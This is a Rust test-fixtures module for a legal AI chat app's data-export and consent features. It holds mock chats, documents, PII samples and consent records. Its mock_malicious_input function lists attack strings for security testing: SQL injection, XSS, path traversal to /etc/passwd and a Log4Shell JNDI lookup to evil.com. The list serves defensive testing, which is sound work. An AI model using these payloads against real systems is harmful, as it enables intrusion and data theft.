// Test Fixtures and Mock Data
//
// This module provides mock data for testing compliance features.
// All fixtures are designed to be realistic but clearly identifiable as test data.

use chrono::{DateTime, Utc};
use serde_json::json;

use crate::export_engine::{
    UserDataExport, ChatExport, MessageExport, DocumentExport,
    PIIDetection, SettingsExport, ExportMetadata, ComplianceInfo
};

/// Generate a complete mock user data export for testing
pub fn mock_user_full() -> UserDataExport {
    UserDataExport {
        export_date: Utc::now(),
        version: "1.0.0".to_string(),
        user_id: "test-user-001".to_string(),
        chats: vec![
            mock_chat("Contract Review", 5),
            mock_chat("Legal Research", 10),
            mock_chat("Client Communication", 3),
        ],
        documents: vec![
            mock_document("employment_contract.pdf", "pdf", 5),
            mock_document("legal_memo.docx", "docx", 3),
            mock_document("case_notes.txt", "txt", 1),
        ],
        settings: mock_settings(),
        metadata: mock_export_metadata(),
    }
}

/// Generate an empty user data export (edge case)
pub fn mock_user_empty() -> UserDataExport {
    UserDataExport {
        export_date: Utc::now(),
        version: "1.0.0".to_string(),
        user_id: "test-user-002".to_string(),
        chats: vec![],
        documents: vec![],
        settings: SettingsExport {
            preferences: json!({}),
            retention_policy: None,
        },
        metadata: mock_export_metadata(),
    }
}

/// Generate a large user data export for performance testing
pub fn mock_user_large() -> UserDataExport {
    let mut chats = Vec::new();
    for i in 0..100 {
        chats.push(mock_chat(&format!("Chat #{}", i), 50));
    }

    let mut documents = Vec::new();
    for i in 0..50 {
        documents.push(mock_document(
            &format!("document_{}.pdf", i),
            "pdf",
            10
        ));
    }

    UserDataExport {
        export_date: Utc::now(),
        version: "1.0.0".to_string(),
        user_id: "test-user-003".to_string(),
        chats,
        documents,
        settings: mock_settings(),
        metadata: mock_export_metadata(),
    }
}

pub fn mock_chat(title: &str, message_count: usize) -> ChatExport {
    let mut messages = Vec::new();
    let base_time = Utc::now();

    for i in 0..message_count {
        messages.push(MessageExport {
            role: if i % 2 == 0 { "user" } else { "assistant" }.to_string(),
            content: format!("Test message content #{}", i),
            timestamp: base_time + chrono::Duration::minutes(i as i64),
            metadata: Some(json!({
                "model": "test-model",
                "tokens": 100
            })),
        });
    }

    ChatExport {
        id: format!("chat-{}", uuid::Uuid::new_v4()),
        title: title.to_string(),
        created_at: base_time,
        updated_at: Utc::now(),
        messages,
        model_used: "gpt-4".to_string(),
        tags: vec!["test".to_string(), "legal".to_string()],
    }
}

pub fn mock_document(filename: &str, file_type: &str, pii_count: usize) -> DocumentExport {
    let mut pii_detections = Vec::new();

    for i in 0..pii_count {
        pii_detections.push(PIIDetection {
            pii_type: if i % 3 == 0 { "EMAIL" } else if i % 3 == 1 { "PHONE" } else { "SSN" }.to_string(),
            replacement_text: format!("[REDACTED_{}]", i),
            confidence: 0.95,
            position_start: i * 100,
            position_end: i * 100 + 20,
        });
    }

    DocumentExport {
        id: (1000 + rand::random::<i64>() % 9000),
        filename: filename.to_string(),
        file_type: file_type.to_string(),
        upload_date: Utc::now(),
        chunk_count: 10,
        pii_detections,
    }
}

pub fn mock_settings() -> SettingsExport {
    SettingsExport {
        preferences: json!({
            "theme": "dark",
            "language": "en-US",
            "analytics_enabled": false,
            "marketing_consent": false
        }),
        retention_policy: Some("90_days".to_string()),
    }
}

pub fn mock_export_metadata() -> ExportMetadata {
    ExportMetadata {
        format_version: "1.0".to_string(),
        application_version: "1.0.23".to_string(),
        export_hash: "a".repeat(64), // Mock SHA-256 hash
        compliance_info: ComplianceInfo {
            gdpr_article_20: true,
            encrypted: false, // Set to true when testing encryption
            integrity_verified: true,
        },
    }
}

/// Mock PII-laden text for detection testing
pub fn mock_text_with_pii() -> String {
    r#"
    Client Information:
    Name: John Smith
    Email: john.smith@example.com
    Phone: +1 (555) 123-4567
    SSN: 123-45-6789
    Credit Card: 4532-1234-5678-9010

    Case Number: 2024-CV-001234
    Medical Record Number: MRN: ABC123456

    Law Firm: Smith & Associates LLC
    Attorney: Dr. Jane Doe
    "#.to_string()
}

/// Mock text without PII (control test)
pub fn mock_text_without_pii() -> String {
    r#"
    Legal Analysis Summary

    The First Amendment protects freedom of speech in the United States.
    The Supreme Court has ruled on numerous cases regarding this matter.

    In New York, the legal framework follows federal guidelines.
    The analysis concludes that the proposed action is within legal bounds.
    "#.to_string()
}

/// Mock malicious input for security testing
pub fn mock_malicious_input() -> Vec<String> {
    vec![
        "'; DROP TABLE users; --".to_string(),
        "<script>alert('XSS')</script>".to_string(),
        "../../../etc/passwd".to_string(),
        "' OR '1'='1".to_string(),
        "${jndi:ldap://evil.com/a}".to_string(),
    ]
}

/// Mock consent scenarios
#[derive(Debug, Clone)]
pub struct ConsentScenario {
    pub user_id: String,
    pub analytics: bool,
    pub marketing: bool,
    pub essential: bool,
    pub timestamp: DateTime<Utc>,
}

pub fn mock_consent_full() -> ConsentScenario {
    ConsentScenario {
        user_id: "test-user-001".to_string(),
        analytics: true,
        marketing: true,
        essential: true,
        timestamp: Utc::now(),
    }
}

pub fn mock_consent_partial() -> ConsentScenario {
    ConsentScenario {
        user_id: "test-user-002".to_string(),
        analytics: true,
        marketing: false,
        essential: true,
        timestamp: Utc::now(),
    }
}

pub fn mock_consent_minimal() -> ConsentScenario {
    ConsentScenario {
        user_id: "test-user-003".to_string(),
        analytics: false,
        marketing: false,
        essential: true,
        timestamp: Utc::now(),
    }
}

pub fn mock_consent_withdrawn() -> ConsentScenario {
    ConsentScenario {
        user_id: "test-user-004".to_string(),
        analytics: false,
        marketing: false,
        essential: false,
        timestamp: Utc::now() - chrono::Duration::days(30),
    }
}
